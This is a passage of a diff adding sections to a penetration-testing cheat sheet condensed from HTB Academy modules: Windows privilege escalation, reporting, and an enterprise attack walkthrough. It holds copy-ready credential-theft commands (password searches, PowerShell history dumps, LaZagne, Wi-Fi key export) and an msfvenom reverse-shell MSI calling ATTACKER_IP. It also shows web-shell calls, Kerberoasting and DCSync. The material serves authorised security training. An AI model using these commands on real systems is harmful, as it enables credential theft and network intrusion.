+        system("cmd.exe /c whoami > C:\\Windows\\Temp\\out.txt");
+        break;
+    }
+    return TRUE;
+}
+```
+
+### Credential Theft
+
+```cmd
+findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
+findstr /spin "password" *.*
+dir /S /B *pass* == *cred* == *vnc* == *.config*
+where /R C:\ *.config
+```
+
+```powershell
+(Get-PSReadLineOption).HistorySavePath
+gc (Get-PSReadLineOption).HistorySavePath
+foreach($user in ((ls C:\users).fullname)){
+  cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+}
+
+$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
+$credential.GetNetworkCredential().username
+$credential.GetNetworkCredential().password
+```
+
+Other sources:
+
+```cmd
+cmdkey /list
+runas /savecred /user:<DOMAIN>\<USER> "cmd.exe"
+```
+
+```powershell
+.\SharpChrome.exe logins /unprotect
+.\lazagne.exe all
+Import-Module .\SessionGopher.ps1
+Invoke-SessionGopher -Target <HOST>
+```
+
+```cmd
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query HKCU\SOFTWARE\SimonTatham\PuTTY\Sessions
+netsh wlan show profile
+netsh wlan show profile <SSID> key=clear
+```
+
+KeePass:
+
+```bash
+python2.7 keepass2john.py <DATABASE>.kdbx > keepass_hash
+hashcat -m 13400 keepass_hash /usr/share/wordlists/rockyou.txt
+```
+
+### Restricted Environments and Additional Techniques
+
+#### Citrix Breakout
+
+- Enumerate the published application and its allowed actions.
+- Use a signed Microsoft binary to launch `cmd.exe` (for example, an MSI or a trusted executable).
+- Check `AlwaysInstallElevated`:
+
+```cmd
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi > aie.msi
+```
+
+```cmd
+msiexec /i C:\Users\<USER>\Desktop\aie.msi /quiet /qn /norestart
+```
+
+#### Scheduled Tasks
+
+```cmd
+schtasks /query /fo LIST /v
+Get-ScheduledTask | select TaskName,State
+accesschk64.exe /accepteula -s -d C:\Scripts\
+```
+
+#### End-of-Life Systems
+
+```powershell
+Set-ExecutionPolicy Bypass -Scope Process
+Import-Module .\Sherlock.ps1
+Find-AllVulns
+```
+
+```bash
+python2 windows-exploit-suggester.py --update
+python2 windows-exploit-suggester.py --database <MSB>.xls --systeminfo <SYSTEMINFO>.txt
+```
+
+### Hardening
+
+- Patch the OS and third-party services; remove EOL systems.
+- Apply least privilege to service accounts and local groups.
+- Use absolute, quoted service paths and restrict write access to service binaries.
+- Disable unnecessary privileges (`SeImpersonate`, `SeDebug`, `SeTakeOwnership`, `SeLoadDriver`).
+- Restrict `AlwaysInstallElevated` and UAC settings.
+- Protect LSASS (`RunAsPPL`), enable Credential Guard, and limit credential caching.
+- Audit local administrators, scheduled tasks, services, and ACLs.
+- Monitor event logs and use EDR/AV.
+
+## 27. Documentation & Reporting
+
+> Condensed from HTB Academy **Documentation & Reporting** (module 162).
+
+### Notetaking and Organization
+
+- Keep one directory per engagement; separate admin, deliverables, evidence, notes, scans, and OSINT.
+- Log every command and its output; timestamp screenshots.
+- Use a consistent note template per host and per finding.
+
+```bash
+mkdir -p ACME-IPT/{Admin,Deliverables,Evidence/{Findings,Scans/{Vuln,Service,Web,AD},Notes,OSINT,Wireless,Logging,Misc},Retest}
+tree ACME-IPT/
+```
+
+Use tmux logging or `script` to capture terminal sessions:
+
+```bash
+# tmux logging (prefix + Shift+P with tmux-logging), or:
+script -a session.log
+```
+
+### Report Types
+
+- **Executive summary** — scope, objectives, high-level risk, business impact.
+- **Technical report** — methodology, findings, evidence, remediation.
+- **Full report** — executive + technical + appendices.
+- **Retest report** — original findings, remediation status, residual risk.
+
+### Components of a Finding
+
+1. **Title** — concise and specific.
+2. **Severity** — CVSS vector/score plus business context.
+3. **Affected assets** — host, URL, parameter, account.
+4. **Description** — root cause and conditions.
+5. **Impact** — what an attacker can achieve.
+6. **Evidence** — reproducible steps, requests/responses, screenshots, timestamps.
+7. **Remediation** — specific, actionable, and prioritized.
+8. **References** — CVE/CWE/OWASP/vendor guidance.
+
+### Writing Tips
+
+- Write for the audience: executives need impact, engineers need reproduction steps.
+- Include exact commands and payloads with sensitive values redacted.
+- Explain *why* a finding matters, not just the scanner output.
+- Separate confirmed findings from informational observations.
+- Use consistent naming and numbering across the report.
+- Review for false positives, typos, and accidental credential exposure.
+- Store evidence according to the engagement's data-retention rules.
+
+### Report Quality Checklist
+
+- [ ] Scope and dates match the contract.
+- [ ] Every finding has evidence and remediation.
+- [ ] CVSS scores and vectors are consistent.
+- [ ] Screenshots are readable and redacted.
+- [ ] No credentials, cookies, hashes, or client secrets in the report.
+- [ ] Executive summary is accurate and free of jargon.
+- [ ] Retest guidance and contact details are included.
+
+## 28. Attacking Enterprise Networks
+
+> Condensed from HTB Academy **Attacking Enterprise Networks** (module 163). This is an end-to-end engagement walkthrough; commands are generic and credentials are redacted.
+
+### Engagement Flow
+
+```text
+Pre-Engagement
+  -> External Information Gathering
+  -> Service/Web Enumeration
+  -> Initial Access
+  -> Internal Information Gathering
+  -> Exploitation & Privilege Escalation
+  -> Lateral Movement
+  -> AD Compromise
+  -> Post-Exploitation
+  -> Closeout
+```
+
+### External Information Gathering
+
+```bash
+# Scope-driven port scanning
+sudo nmap --open -oA external_tcp_1k -iL scope
+sudo nmap --open -p- -A -oA external_tcp_all -iL scope
+
+# DNS zone transfer
+dig axfr <DOMAIN> @<NAMESERVER>
+
+# Virtual-host discovery
+curl -s -I http://<TARGET> -H "Host: <VHOST>.<DOMAIN>" | grep "Content-Length:"
+ffuf -w namelist.txt:FUZZ -u http://<TARGET>/ -H 'Host: FUZZ.<DOMAIN>' -fs <SIZE>
+
+# Add discovered hosts
+sudo tee -a /etc/hosts > /dev/null <<'EOF'
+<TARGET_IP>  <VHOST>.<DOMAIN>
+EOF
+```
+
+### Service and Web Enumeration
+
+```bash
+ftp <TARGET>
+nc -nv <TARGET> 22
+ssh <USER>@<TARGET>
+nmap -sV -sC -p25 <TARGET>
+telnet <TARGET> 25
+telnet <TARGET> 110
+nmap -p25 -Pn --script smtp-open-relay <TARGET>
+rpcinfo <TARGET>
+
+# Web
+eyewitness -f <SUBDOMAINS> -d eyewitness_out
+whatweb http://<TARGET>
+gobuster dir -u http://<TARGET> -w /usr/share/wordlists/dirb/common.txt -x .php -t 300
+wpscan -e ap -t 500 --url http://<TARGET>
+wpscan -e u -t 500 --url http://<TARGET>
+```
+
+### Initial Access
+
+- Exploit the exposed service or web application.
+- Upload a web shell or use a public exploit/PoC.
+- Establish a stable reverse shell and upgrade the TTY.
+- Document the exact request/payload used.
+
+```bash
+# Example web shell call
+curl 'http://<TARGET>/uploads/shell.php?cmd=id'
+
+# Listener
+nc -lvnp <PORT>
+```
+
+### Internal Information Gathering
+
+```bash
+# Dynamic SOCKS pivot over SSH
+ssh -D 8081 -i <KEY> <USER>@<PIVOT>
+grep socks4 /etc/proxychains.conf
+proxychains nmap -sT -p 21,22,80,8080 <INTERNAL_IP>
+
+# Living-off-the-land discovery
+for i in $(seq 254); do ping -c1 -W1 172.16.8.$i & done | grep from
+proxychains enum4linux -U -P <INTERNAL_IP>
+proxychains showmount -e <INTERNAL_IP>
+
+# Mount an NFS share
+mkdir <MOUNT>
+mount -t nfs <INTERNAL_IP>:/<SHARE> /tmp/<MOUNT>
+```
+
+### Lateral Movement and AD Compromise
+
+```bash
+# SMB/winrm through the pivot
+proxychains crackmapexec smb <INTERNAL_IP> -u <USER> -p '<PASSWORD>' --shares
+proxychains evil-winrm -i <INTERNAL_IP> -u <USER> -p '<PASSWORD>'
+
+# AD enumeration and Kerberoasting
+Get-DomainUser * -SPN | select samaccountname
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\spns.csv -NoTypeInformation
+hashcat -m 13100 spns.csv /usr/share/wordlists/rockyou.txt
+
+# ACL abuse and DCSync
+Add-DomainGroupMember -Identity "<GROUP>" -Members "<USER>" -Credential $Cred -Verbose
+proxychains secretsdump.py <USER>@<DC> -just-dc-ntlm
+```
+
+Use `proxychains` for every internal tool, keep a per-host log, and avoid changing the environment unless required by the scope.
+
+### Post-Exploitation and Closeout
+
+- Collect only the evidence needed to prove impact.
+- Clean up uploaded shells, accounts, scheduled tasks, and service changes.
+- Remove temporary files and restore modified configuration.
+- Write the report with the attack chain, evidence, and remediation.
+- Hold a closeout/review meeting and define retest scope.
+
+### Engagement Checklist
+
+- [ ] Scope, RoE, and emergency contacts confirmed.
+- [ ] External attack surface mapped and evidenced.
+- [ ] Initial access documented with reproducible steps.
+- [ ] Internal pivot and enumeration logged.
+- [ ] Privilege escalation and lateral movement proven.
+- [ ] AD compromise (if in scope) documented.
+- [ ] Cleanup completed and verified.
+- [ ] Report reviewed and delivered.
+
+## 29. Useful Resources
 
 [HackTricks](https://book.hacktricks.xyz/)
 
